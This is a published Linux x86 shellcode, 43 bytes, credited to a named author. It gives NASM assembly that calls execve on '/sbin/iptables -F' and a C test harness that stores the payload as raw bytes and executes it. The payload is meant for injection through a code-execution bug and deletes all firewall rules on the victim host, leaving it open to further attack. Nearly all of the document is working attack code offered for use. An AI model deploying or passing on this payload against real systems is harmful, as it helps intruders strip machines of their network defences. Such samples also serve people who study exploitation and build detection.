/**********************************************/
/*  linux/x86 iptables -F  Length: 43 bytes   */
/*                                            */
/*                  03/01/2019                */
/*                                            */
/*            Author: Cameron Brown           */
/*                                            */
/*         Email: pwoerTF@gmail.com           */
/**********************************************/

global _start

section .text

_start:
	jmp short get
code:
	pop ebx
	cdq
	mov [ebx+0xe], dl

	lea eax, [ebx+0xf]
	push edx
	push eax
	push ebx
	mov ecx, esp

	mov eax, edx
	mov al, 0xb
	int 0x80
get:
	call code
	file: db "/sbin/iptables#-F"


--------------------------------------------------


#include<stdio.h>
#include<string.h>


unsigned char code[] = \
"\xeb\x13\x5b\x99\x88\x53\x0e\x8d\x43\x0f\x52\x50\x53\x89\xe1\x89\xd0\xb0\x0b\xcd\x80\xe8\xe8\xff\xff\xff\x2f\x73\x62\x69\x6e\x2f\x69\x70\x74\x61\x62\x6c\x65\x73\x23\x2d\x46";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}